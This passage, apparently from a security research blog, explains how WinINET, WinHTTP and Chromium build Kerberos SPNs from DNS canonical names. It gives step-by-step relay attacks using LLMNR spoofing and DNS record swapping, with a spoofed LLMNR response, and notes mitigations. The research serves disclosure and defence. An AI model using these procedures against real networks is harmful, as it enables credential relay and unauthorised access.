 <p class="c0"><span>One limitation is that without a call to </span><span class="c4">CoInitializeSecurity, </span><span>the default impersonation level for the client is set to </span><span class="c4">RPC_C_IMP_LEVEL_IDENTIFY</span><span>. This means the access token generated by the DCOM RPC authentication can only be used for identification and not for impersonation. For some services this isn&#39;t an issue, for example LDAP doesn&#39;t need an impersonation level token. However for others such as SMB this would prevent access to files. It&#39;s possible that you could find a COM client which sets both </span><span class="c4">RPC_C_AUTHN_LEVEL_CONNECT </span><span>and </span><span class="c4">RPC_C_IMP_LEVEL_IMPERSONATE</span><span class="c3">&nbsp;though there&#39;s no trivial process to assess that.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">Getting a client to connect to the server isn&#39;t trivial as DCOM isn&#39;t a widely used protocol on modern Windows networks due to high authentication requirements. However, one use case for this is local privilege escalation. For example you could get a privileged service to connect to the malicious COM server and relay the computer account Kerberos AP_REQ which is generated. I have a working PoC for this which allows a local non-admin user to connect to the domain&#39;s LDAP server using the local computer&#39;s credentials. </span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>This attack is somewhat similar to the </span><span class="c8"><a class="c51" href="https://github.com/antonioCoco/RemotePotato0">RemotePotato</a></span><span>&nbsp;attack (which uses NTLM rather than Kerberos) which again Microsoft have refused to fix. I&#39;ll describe this in more detail in a separate </span><span>blog post after this one</span><span class="c3">.</span></p><h2 class="c26" id="h.hn66nwtnflze"><span class="c6 c19">HTTP</span></h2>
 <p class="c0"><span>HTTP has supported </span><span class="c4">NTLM</span><span>&nbsp;and </span><span class="c4">Negotiate</span><span>&nbsp;authentication for a long time (see </span><span class="c8"><a class="c51" href="https://datatracker.ietf.org/doc/html/draft-brezak-spnego-http-04">this draft</a></span><span>&nbsp;from 2002 although the most recent RFC is </span><span class="c8"><a class="c51" href="https://datatracker.ietf.org/doc/html/rfc4559">4559</a></span><span>&nbsp;from 2006). To initiate a Windows authentication session the server can respond to a request with the status code 401 and specify a </span><span class="c4">WWW-Authenticate</span><span>&nbsp;header with the value </span><span class="c4">Negotiate</span><span>. If the client supports Windows authentication it can use </span><span class="c4">InitializeSecurityContext</span><span>&nbsp;to generate a token, convert the binary token into a Base64 string and send it in the next request to the server with the </span><span class="c4">Authorization</span><span class="c3">&nbsp;header. This process is repeated until the client errors or the authentication succeeds.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>In theory only </span><span class="c4">NTLM</span><span>&nbsp;and </span><span class="c4">Negotiate</span><span>&nbsp;are defined but a HTTP implementation could use other Windows authentication packages such as </span><span class="c4">Kerberos </span><span class="c3">if it so chose to. Whether the HTTP client will automatically use the user&#39;s credentials is up to the user agent or the developer using it as a library.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">All the major browsers support both authentication types as well as many non browser HTTP user agents such as those in .NET and WinHTTP. I looked at the following implementations, all running on Windows 10 21H1:</span></p><ul style="padding: 0;" class="c24 lst-kix_fmj6vk2ylkib-0 start"><li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"><span class="c3">WinINET (Internet Explorer 11)</span></li><li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"><span class="c3">WinHTTP (WebClient)</span></li><li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"><span class="c3">Chromium M93 (Chrome and Edge)</span></li><li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"><span class="c3">Firefox 91</span></li><li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"><span class="c3">.NET Framework 4.8</span></li><li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"><span class="c3">.NET 5.0 and 6.0</span></li></ul>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">This is of course not an exhaustive list, and there&#39;s likely to be many different HTTP clients in Windows which might have different behaviors. I&#39;ve also not looked at how non-Windows clients work in this regard. </span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>There&#39;s two important behaviors that I wanted to assess with HTTP. First is how the user agent determines when to perform automatic Windows authentication using the current user&#39;s credentials. In order to relay the authentication it can&#39;t ask the user for their credentials. And second we want to know how the SPN is selected by the user agent when calling </span><span class="c4">InitializeSecurityContext</span><span class="c3">.</span></p><h3 class="c32" id="h.7drfeuxw9d9q"><span class="c31">WinINET (Internet Explorer 11)</span></h3>
 <p class="c0"><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/windows/win32/wininet/portal">WinINET</a></span><span>&nbsp;can be used as a generic library to handle HTTP connections and authentication. There&#39;s likely many different users of WinINET but we&#39;ll just look at Internet Explorer 11 as that is what it&#39;s most known for. WinINET is also the originator of HTTP </span><span class="c4">Negotiate </span><span>authentication</span><span class="c3">, so it&#39;s good to get a baseline of what WinINET does in case other libraries just copied its behavior.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">First, how does WinINET determine when it should handle Windows authentication automatically? By default this is based on whether the target host is considered to be in the Intranet Zone. This means any host which bypasses the configured HTTP proxy or uses an undotted name will be considered Intranet zone and WinINET will automatically authenticate using the current user&#39;s credentials.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>It&#39;s possible to disable this behavior by changing the security options for the Intranet Zone to &quot;Prompt for </span><span>user name</span><span class="c3">&nbsp;and password&quot;, as shown below:</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"></p>
 <p class="c0"><span class="c4"><a href="https://blogger.googleusercontent.com/img/a/AVvXsEi0PEBYNeQYyCFc_m0LHSgoGRsniCGYJYWXZuD4Ix1SXwSklWAhLmMg5NknUrJ7q4jAjDVhx0raXfmQXk9a3TPvJqUKT0pdcyNnv2h9KzFrhdJzQGmoHRFCCUhRfp0RexYbR9hkmu3SnPy5sBKjgUMsv5gZFka1gAv7evU_d5E7iQOPegQCv4c8360SmQ=s699" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/a/AVvXsEi0PEBYNeQYyCFc_m0LHSgoGRsniCGYJYWXZuD4Ix1SXwSklWAhLmMg5NknUrJ7q4jAjDVhx0raXfmQXk9a3TPvJqUKT0pdcyNnv2h9KzFrhdJzQGmoHRFCCUhRfp0RexYbR9hkmu3SnPy5sBKjgUMsv5gZFka1gAv7evU_d5E7iQOPegQCv4c8360SmQ=s699" border="0" alt="Screenshot of the system Internet Options Security Settings showing how to disable automatic authentication" style="max-height: 750px; max-width: 600px;" /></a></span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>Next, how does WinINET determine the SPN to use for </span><span class="c4">Negotiate </span><span class="c3">authentication? RFC4559 says the following:</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c25 c14 c4">&#39;When the Kerberos Version 5 GSSAPI mechanism [RFC4121] is being used, the HTTP server will be using a principal name of the form of &quot;HTTP/hostname&quot;&#39;</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>You might assume therefore that the HTTP URL that WinINET is connecting to would be sufficient to build the SPN: just use the hostname as provided and combine with the HTTP service class. However it turns out that&#39;s not entirely the case. I found a rough description of how IE and WinINET actually generate the SPN in </span><span class="c8"><a class="c51" href="https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/internet-explorer-behaviors-with-kerberos-authentication/ba-p/396428">this blog</a></span><span>. </span><span>This blog post is over 10 years old so it was possible that things have changed, however it turns out to not be the case</span><span class="c3">.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>The basic approach is that WinINET doesn&#39;t necessarily trust the hostname specified in the HTTP URL. Instead it requests the canonical name of the server via DNS. It doesn&#39;t seem to explicitly request a CNAME record from the DNS server. Instead it calls </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/windows/win32/api/ws2tcpip/nf-ws2tcpip-getaddrinfo">getaddrinfo</a></span><span class="c4">&nbsp;</span><span>and specifies the </span><span class="c4">AI_CANONNAME</span><span>&nbsp;hint. Then it uses the returned value of </span><span class="c4">ai_canonname</span><span>&nbsp;and prefixes it with the </span><span class="c4">HTTP</span><span>&nbsp;service class</span><span>. In general </span><span class="c4">ai_canonname</span><span class="c3">&nbsp;is the name provided by the DNS server in the returned A/AAAA record.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>For example, if the HTTP URL is </span><span class="c4">http://fileserver.domain.com</span><span>, but the DNS A record contains the canonical name </span><span class="c4">example.domain.com</span><span>&nbsp;the generated SPN is </span><span class="c4">HTTP/example.domain.com</span><span>&nbsp;and not </span><span class="c4">HTTP/fileserver.domain.com</span><span class="c3">. Therefore to provide an arbitrary SPN you need to get the name in the DNS address record to differ from the IP address in that record so that IE will connect to a server we control while generating Kerberos authentication for a different target name.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">The most obvious technique would be to specify a DNS CNAME record which redirects to another hostname. However, at least if the client is using a Microsoft DNS server (which is likely for a domain environment) then the CNAME record is not directly returned to the client. Instead the DNS server will perform a recursive lookup, and then return the CNAME along with the validated address record to the client. </span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>Therefore, if an attacker sets up a CNAME record for </span><span class="c4">www.evil.com</span><span>, which redirects to </span><span class="c4">fileserver.domain.com</span><span>&nbsp;the DNS server will return the CNAME record and an address record for the real IP address of </span><span class="c4">fileserver.domain.com</span><span>. WinINET will try to connect to the HTTP service on </span><span class="c4">fileserver.domain.com</span><span>&nbsp;rather than </span><span class="c4">www.evil.com</span><span class="c3">&nbsp;which is what is needed for the attack to function.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>I tried various ways of tricking the DNS client into making a direct request to a DNS server I controlled but I couldn&#39;t seem to get it to work. However, it turns out there is a way to get the DNS resolver to accept arbitrary DNS responses, via local DNS resolution protocols such as </span><span class="c8"><a class="c51" href="https://datatracker.ietf.org/doc/html/rfc6762">Multicast DNS (MDNS)</a></span><span>&nbsp;and </span><span class="c8"><a class="c51" href="https://datatracker.ietf.org/doc/html/rfc4795">Link-Local Multicast Name Resolution (LLMNR)</a></span><span class="c3">. </span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>These two protocols use a lightly modified DNS packet structure, so you can return a response to the name resolution request with an address record with the IP address of the malicious web server, but the canonical name of any server. WinINET will then make the HTTP connection to the malicious web server but construct the SPN for the spoofed canonical name. I&#39;ve verified this with LLMNR and in theory MDNS should work as well.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>Is spoofing the canonical name a bug in the Windows DNS client resolver? I don&#39;t believe any DNS protocol requires the query name to exactly match the answer name. If the DNS server has a CNAME record for the queried host then there&#39;s no obvious requirement for it to return that record when it could just return the address record. Of course if a public DNS server could spoof a host for a DNS zone which it didn&#39;t control, that&#39;d be a </span><span class="c8"><a class="c51" href="https://www.cs.cornell.edu/~shmat/shmat_securecomm10.pdf">serious security issue</a></span><span>. It&#39;s also worth noting that this doesn&#39;t spoof the name generally. As the cached DNS entry on Windows is based on the query name, if the client now resolves </span><span class="c4">fileserver.domain.com</span><span class="c3">&nbsp;a new DNS request will be made and the DNS server would return the real address.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>Attacking local name resolution protocols is a well known weakness abused for MitM attacks, so it&#39;s likely that some security conscious networks will disable the protocols. However, the advantage of using LLMNR this way over its use for MitM is that the resolved name can be anything. As in, normally you&#39;d want to spoof the DNS name of an existing host, in our example you&#39;d spoof the request for the </span><span class="c4">fileserver</span><span class="c3">&nbsp;name. But for registered computers on the network the DNS client will usually satisfy the name resolution via the network&#39;s DNS server before ever trying local DNS resolution. Therefore local DNS resolution would never be triggered and it wouldn&#39;t be possible to spoof it. For relaying Kerberos authentication we don&#39;t care, you can induce a client to connect to an unregistered host name which will fallback to local DNS resolution.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">The big problem with the local DNS resolution attack vector is that the attacker must be in the same multicast domain as the victim computer. However, the attacker can still start the process by getting a user to connect to an external domain which looks legitimate then redirect to an undotted name to both force automatic authentication and local DNS resolving.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"></p>
 <p class="c0"><span class="c4"><a href="https://blogger.googleusercontent.com/img/a/AVvXsEjm2PtQTZlQobqpEmVuy_72dJbu90cytEZH8jKN3ZwLkCzOMKQa0Rwfk0FVqKaPu5fyDimYp_gWkAxJHjdZU45OIVRD3EiPE_sd1jEmTCTLtPgMz96bHOM6SQrTPx7OJt3A3O65vdC1lRtF3y8pKchdwcst1J7oJCMIFb_PMGOcvy9CFEKz6Y3vbMTZ9g=s877" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/a/AVvXsEjm2PtQTZlQobqpEmVuy_72dJbu90cytEZH8jKN3ZwLkCzOMKQa0Rwfk0FVqKaPu5fyDimYp_gWkAxJHjdZU45OIVRD3EiPE_sd1jEmTCTLtPgMz96bHOM6SQrTPx7OJt3A3O65vdC1lRtF3y8pKchdwcst1J7oJCMIFb_PMGOcvy9CFEKz6Y3vbMTZ9g=s877" border="0" alt="Diagram of the local DNS resolving attack against WinINET" style="max-height: 750px; max-width: 600px;" /></a></span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">To summarize the attack process as shown in the above diagram:</span></p><ol class="c24 lst-kix_i2wckd3yhfhe-0 start" start="1"><li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"><span>The attacker sets up an LLMNR service on a machine in the same multicast domain at the victim computer. The attacker listens for a target name request such as </span><span class="c4">EVILHOST</span><span class="c3">.</span></li><li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"><span>Trick the victim to use IE (or another WinINET client, such as via a document format like DOCX) to connect to the attacker&#39;s server on </span><span class="c4">http://EVILHOST</span><span class="c3">.</span></li><li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"><span class="c3">The LLMNR server receives the lookup request and responds by setting the address record&#39;s hostname to the SPN target host to spoof and the IP address to the attacker-controlled server.</span></li><li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"><span>The WinINET client extracts the spoofed canonical name, appends the </span><span class="c4">HTTP </span><span class="c3">service class to the SPN and requests the Kerberos service ticket. This Kerberos ticket is then sent to the attacker&#39;s HTTP service.</span></li><li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"><span class="c3">The attacker receives the Negotiate/Kerberos authentication for the spoofed SPN and relays it to the real target server.</span></li></ol>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>An example LLMNR response decoded by Wireshark for the name </span><span class="c4">evilhost</span><span>&nbsp;(with IP address 10.0.0.80), spoofing </span><span class="c4">fileserver.domain.com</span><span>&nbsp;(which is </span><span class="c4">not </span><span class="c3">address 10.0.0.80) is shown below:</span></p><a id="t.b649351b399dcc493def89e3b9168ea435d7a3e3"></a><a id="t.1"></a><table class="c21"><tbody><tr class="c20"><td class="c11" colspan="1" rowspan="1">
 <p class="c0"><span class="c12 c14 c4">Link-local Multicast Name Resolution (response)</span></p>
 <p class="c0"><span class="c12 c14 c4">&nbsp; &nbsp; Transaction ID: 0x910f</span></p>
 <p class="c0"><span class="c12 c14 c4">&nbsp; &nbsp; Flags: 0x8000 Standard query response, No error</span></p>
 <p class="c0"><span class="c12 c14 c4">&nbsp; &nbsp; Questions: 1</span></p>
 <p class="c0"><span class="c12 c14 c4">&nbsp; &nbsp; Answer RRs: 1</span></p>
 <p class="c0"><span class="c12 c14 c4">&nbsp; &nbsp; Authority RRs: 0</span></p>
 <p class="c0"><span class="c12 c14 c4">&nbsp; &nbsp; Additional RRs: 0</span></p>
 <p class="c0"><span class="c12 c14 c4">&nbsp; &nbsp; Queries</span></p>
 <p class="c0"><span class="c12 c14 c4">&nbsp; &nbsp; &nbsp; &nbsp; evilhost: type A, class IN</span></p>
 <p class="c0"><span class="c12 c14 c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Name: evilhost</span></p>
 <p class="c0"><span class="c12 c14 c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [Name Length: 8]</span></p>
 <p class="c0"><span class="c12 c4 c14">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [Label Count: 1]</span></p>
 <p class="c0"><span class="c12 c14 c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Type: A (Host Address) (1)</span></p>
 <p class="c0"><span class="c12 c14 c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Class: IN (0x0001)</span></p>
 <p class="c0"><span class="c12 c14 c4">&nbsp; &nbsp; Answers</span></p>
 <p class="c0"><span class="c12 c14 c4">&nbsp; &nbsp; &nbsp; &nbsp; fileserver.domain.com: type A, class IN, addr 10.0.0.80</span></p>
 <p class="c0"><span class="c12 c14 c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Name: fileserver.domain.com</span></p>
 <p class="c0"><span class="c12 c14 c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Type: A (Host Address) (1)</span></p>
 <p class="c0"><span class="c12 c14 c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Class: IN (0x0001)</span></p>
 <p class="c0"><span class="c12 c14 c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Time to live: 1 (1 second)</span></p>
 <p class="c0"><span class="c12 c14 c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Data length: 4</span></p>
 <p class="c0"><span class="c4 c42">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Address: 10.0.0.80</span></p></td></tr></tbody></table>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>You might assume that the SPN always having the </span><span class="c4">HTTP </span><span>service class would be a problem. However, the Active Directory default SPN mapping will map </span><span class="c4">HTTP </span><span>to the </span><span class="c4">HOST </span><span class="c3">service class which is always registered. Therefore you can target any domain joined system without needing to register an explicit SPN. As long as the receiving service doesn&#39;t then verify the SPN it will work to authenticate to the computer account, which is used by privileged services. You can use the following PowerShell script to list all the configured SPN mappings in a domain.</span></p>
 <p class="c0 c9"><span class="c3"></span></p><a id="t.28ed80520ca46d9c5e76e6e7185f42f9102dbf8d"></a><a id="t.2"></a><table class="c21"><tbody><tr class="c20"><td class="c11" colspan="1" rowspan="1">
 <p class="c1"><span class="c2">PS&gt; </span><span class="c2 c23">$base_dn</span><span class="c2">&nbsp;</span><span class="c2 c17">=</span><span class="c2">&nbsp;(</span><span class="c2 c13">Get-ADRootDSE</span><span class="c2">)</span><span class="c2 c17">.</span><span class="c6 c2">configurationNamingContext</span></p>
 <p class="c1"><span class="c2">PS&gt; </span><span class="c2 c23">$dn</span><span class="c2">&nbsp;</span><span class="c2 c17">=</span><span class="c2">&nbsp;</span><span class="c2 c27">&quot;CN=Directory Service,CN=Windows NT,CN=Services,</span><span class="c2 c23">$base_dn</span><span class="c2 c27">&quot;</span></p>
 <p class="c1"><span class="c2">PS&gt; (</span><span class="c2 c13">Get-ADObject</span><span class="c2">&nbsp;</span><span class="c2 c23">$dn</span><span class="c2">&nbsp;</span><span class="c2 c34">-Properties</span><span class="c2">&nbsp;</span><span class="c2 c35">sPNMappings</span><span class="c2">)</span><span class="c2 c17">.</span><span class="c6 c2">sPNMappings</span></p></td></tr></tbody></table>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>One interesting behavior of WinINET is that it always requests </span><span class="c4">Kerberos</span><span>&nbsp;delegation, although that will only be useful if the SPN&#39;s target account is registered for delegation. I couldn&#39;t convince WinINET to default to a Kerberos only mode; sending back a </span><span class="c4">WWW-Authenticate: Kerberos</span><span class="c3">&nbsp;header causes the authentication process to stop. This means the Kerberos AP_REQ will always have Integrity enabled even though the user agent doesn&#39;t explicitly request it.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">Another user of WinINET is Office. For example you can set a template located on an HTTP URL which will generate local Windows authentication if in the Intranet zone just by opening a Word document. This is probably a good vector for getting the authentication started rather than relying on Internet Explorer being available.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>WinINET does have some </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms537164(v=vs.85)">feature controls</a></span><span>&nbsp;which can be enabled on a per-executable basis which affect the behavior of the SPN lookup process, specifically </span><span class="c4">FEATURE_USE_CNAME_FOR_SPN_KB911149</span><span class="c3">&nbsp;and </span></p>
 <p class="c0"><span class="c4">FEATURE_ALWAYS_USE_DNS_FOR_SPN_KB3022771</span><span class="c3">. However these only seem to come into play if the HTTP connection is being proxied, which we&#39;re assuming isn&#39;t the case.</span></p><h3 class="c32" id="h.8vgvwmfq3mv1"><span class="c31">WinHTTP (WebDAV WebClient)</span></h3>
 <p class="c0"><span>The </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/windows/win32/winhttp/about-winhttp">WinHTTP library</a></span><span>&nbsp;is an alternative to using WinINET in a client application. It&#39;s a cleaner API and doesn&#39;t have the baggage of being used in Internet Explorer. As an example client I chose to use the built-in WebDAV WebClient service because it gives the interesting property that it converts a UNC file name request into a potentially exploitable HTTP request. If the WebClient service is installed and running then opening a file of the form </span><span class="c4">\\EVIL\abc</span><span class="c3">&nbsp;will cause an HTTP request to be sent out to a server under the attacker&#39;s control.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>From what I can tell the behavior of WinHTTP when used with the WebClient service is almost exactly the same as for WinINET. I could exploit the SPN generation through local DNS resolution, but not from a public DNS name record. WebDAV seems to consider undotted names to be Intranet zone, however the default for WinHTTP seems to depend on whether the connection would bypass the proxy. The automatic authentication decision is based on the value of the </span><span class="c4">WINHTTP_OPTION_AUTOLOGON_POLICY</span><span class="c3">&nbsp;policy.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>At least as used with WebDAV WinHTTP handles a </span><span class="c4">WWW-Authenticate</span><span>&nbsp;header of </span><span class="c4">Kerberos</span><span>, however it ends up using the </span><span class="c4">Negotiate</span><span class="c3">&nbsp;package regardless and so Integrity will always be enabled. It also enables Kerberos delegation automatically like WinINET.</span></p><h3 class="c32" id="h.pjg6jrw6yjqn"><span class="c31">Chromium M93</span></h3>
 <p class="c0"><span>Chromium based browsers such as Chrome and Edge are open source so it&#39;s a bit easier to check the implementation. By default Chromium will automatically authenticate to intranet zone sites, it uses the same Internet Security Manager used by WinINET to make the zone determination in </span><span class="c8"><a class="c51" href="https://source.chromium.org/chromium/chromium/src/+/main:net/http/url_security_manager_win.cc;drc=739ccc21289257112c667e04a40d9a5a2db466bf;l=50">URLSecurityManagerWin::CanUseDefaultCredentials</a></span><span class="c3">. An administrator can set GPOs to change this behavior to only allow automatic authentication to a set of hosts.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>The SPN is generated in </span><span class="c8"><a class="c51" href="https://source.chromium.org/chromium/chromium/src/+/main:net/http/http_auth_handler_negotiate.cc;drc=78c0778431c6fdd3dead532b1774270486829251;l=248">HttpAuthHandlerNegotiate::CreateSPN</a></span><span>&nbsp;which is called from </span><span class="c8"><a class="c51" href="https://source.chromium.org/chromium/chromium/src/+/main:net/http/http_auth_handler_negotiate.cc;drc=a412d0ef42cd54ca75e76023a8ccf13d6f58bf06;l=356">HttpAuthHandlerNegotiate::DoResolveCanonicalNameComplete</a></span><span>. While the documentation for </span><span class="c4">CreateSPN </span><span class="c3">mentions it&#39;s basically a copy of the behavior in IE, it technically isn&#39;t. Instead of taking the canonical name from the initial DNS request it does a second DNS request, and the result of that is used to generate the SPN. </span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">This second DNS request is important as it means that we now have a way of exploiting this from a public DNS name. If you set the TTL of the initial host DNS record to a very low value, then it&#39;s possible to change the DNS response between the lookup for the host to connect to and the lookup for the canonical name to use for the SPN. </span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>This will also work with local DNS resolution as well, though in that case the response doesn&#39;t need to be switched as one response is sufficient. This second DNS lookup behavior can be disabled with a </span><span class="c8"><a class="c51" href="https://admx.help/?Category=Chrome&Policy=Google.Policies.Chrome::DisableAuthNegotiateCnameLookup">GPO</a></span><span class="c3">. If this is disabled then neither local DNS resolution nor public DNS will work as Chromium will use the host specified in the URL for the SPN.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>In a domain environment where the Chromium browser is configured to only authenticate to Intranet sites we can abuse the fact that by default authenticated users can add new DNS records to the Microsoft DNS server through LDAP (see </span><span class="c8"><a class="c51" href="https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/">this blog post</a></span><span>&nbsp;by </span><span class="c8"><a class="c51" href="https://twitter.com/kevin_robertson">Kevin Robertson</a></span><span class="c3">). Using the domain&#39;s DNS server is useful as the DNS record could be looked up using a short Intranet name rather than a public DNS name meaning it&#39;s likely to be considered a target for automatic authentication.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>One problem with using LDAP to add the DNS record is the time before the DNS server will refresh its records is at least 180 seconds. This would make it difficult to switch the response from a normal address record to a CNAME record in a short enough time frame to be useful. Instead we can add an NS record to the DNS server which forwards the lookup to our own DNS server. As long as the TTL for the DNS response is short the domain&#39;s DNS server will rerequest the record and we can return different responses without any waiting for the DNS server to update from LDAP. This is very similar to </span><span class="c8"><a class="c51" href="https://en.wikipedia.org/wiki/DNS_rebinding">DNS rebinding attack</a></span><span class="c3">, except instead of swapping the IP address, we&#39;re swapping the canonical name.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"></p>
 <p class="c0"><span class="c25 c14 c4"><a href="https://blogger.googleusercontent.com/img/a/AVvXsEh1TOvmY3p9cuk3lJdRZ8WKstDkX6N1_3iBLKo-IKFncIiRuokfjzJE4sXdb3O89inLCz5s6H7lO4_Pq8HVdMwzyJvYIao-IhSKRJm-vHBSlDzBFfe7vJhL05iKhn_1Jy9mft4nSrNY7eggb2KsfjO2JXEtSlqfV44Pd8cDODKHEK087TBDryW82cGTHA=s898" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/a/AVvXsEh1TOvmY3p9cuk3lJdRZ8WKstDkX6N1_3iBLKo-IKFncIiRuokfjzJE4sXdb3O89inLCz5s6H7lO4_Pq8HVdMwzyJvYIao-IhSKRJm-vHBSlDzBFfe7vJhL05iKhn_1Jy9mft4nSrNY7eggb2KsfjO2JXEtSlqfV44Pd8cDODKHEK087TBDryW82cGTHA=s898" border="0" alt="Diagram of two DNS request attack against Chromium" style="max-height: 750px; max-width: 600px;" /></a></span></p>
 <p class="c0 c9"><span class="c25 c14 c4"></span></p>
 <p class="c0"><span class="c3">Therefore a working exploit as shown in the diagram would be the following:</span></p>
 <p class="c0 c9"><span class="c3"></span></p><ol class="c24 lst-kix_wkcrlfh2qk3l-0 start" start="1"><li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"><span>Register an NS record with the DNS server for </span><span class="c4">evilhost.domain.com</span><span class="c3">&nbsp;using existing authenticated credentials via LDAP. Wait for the DNS server to pick up the record.</span></li><li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"><span>Direct the browser to connect to </span><span class="c4">http://evilhost</span><span>. T</span><span>his allows Chromium to automatically authenticate as it&#39;s an undotted Intranet host. The browser will lookup </span><span class="c4">evilhost.domain.com</span><span class="c3">&nbsp;by adding its primary DNS suffix. </span></li><li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"><span class="c3">This request goes to the client&#39;s DNS server, which then follows the NS record and performs a recursive query to the attacker&#39;s DNS server. </span></li><li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"><span class="c3">The attacker&#39;s DNS server returns a normal address record for their HTTP server with a very short TTL.</span></li><li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"><span class="c3">The browser makes a request to the HTTP server, at this point the attacker delays the response long enough for the cached DNS request to expire. It can then return a 401 to get the browser to authenticate.</span></li><li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"><span>The browser makes a second DNS lookup for the canonical name. As the original request has expired, another will be made for </span><span class="c4">evilhost.domain.com</span><span>. For this lookup the attacker returns a CNAME record for the </span><span class="c4">fileserver.domain.com</span><span class="c3">&nbsp;target. The client&#39;s DNS server will look up the IP address for the CNAME host and return that.</span></li><li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"><span>The browser will generate the SPN based on the CNAME record and that&#39;ll be used to generate the AP_REQ, sending it to the attacker&#39;s HTTP server.</span></li><li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"><span class="c3">The attacker can relay the AP_REQ to the target server.</span></li></ol>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">It&#39;s possible that we can combine the local and public DNS attack mechanisms to only need one DNS request. In this case we could set up an NS record to our own DNS server and get the client to resolve the hostname. The client&#39;s DNS server would do a recursive query, and at this point our DNS server shouldn&#39;t respond immediately. We could then start a classic DNS spoofing attack to return a DNS response packet directly to the client with the spoofed address record.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">In general DNS spoofing is limited by requiring the source IP address, transaction ID and the UDP source port to match before the DNS client will accept the response packet. The source IP address should be spoofable on a local network and the client&#39;s IP address can be known ahead of time through an initial HTTP connection, so the only problems are the transaction ID and port.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
